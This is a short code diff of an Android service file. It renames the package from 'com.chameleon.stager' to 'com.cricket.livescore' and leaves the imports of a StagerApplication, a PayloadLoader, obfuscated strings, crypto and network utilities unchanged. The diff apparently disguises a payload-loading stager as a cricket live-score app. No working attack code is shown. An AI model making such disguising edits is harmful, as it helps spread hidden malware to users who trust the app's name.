@@ -1,4 +1,4 @@
-package com.chameleon.stager.service
+package com.cricket.livescore.service
 
 import android.app.Notification
 import android.app.NotificationChannel
@@ -12,13 +12,13 @@ import android.os.Build
 import android.os.IBinder
 import android.util.Log
 import androidx.core.app.NotificationCompat
-import com.chameleon.stager.R
-import com.chameleon.stager.StagerApplication
-import com.chameleon.stager.payload.PayloadLoader
-import com.chameleon.stager.ui.MainActivity
-import com.chameleon.stager.utils.CryptoUtils
-import com.chameleon.stager.utils.NetworkUtils
-import com.chameleon.stager.utils.ObfuscatedStrings
+import com.cricket.livescore.R
+import com.cricket.livescore.StagerApplication
+import com.cricket.livescore.payload.PayloadLoader
+import com.cricket.livescore.ui.MainActivity
+import com.cricket.livescore.utils.CryptoUtils
+import com.cricket.livescore.utils.NetworkUtils
+import com.cricket.livescore.utils.ObfuscatedStrings
 import org.json.JSONArray
 import org.json.JSONObject
 import java.util.concurrent.CountDownLatch
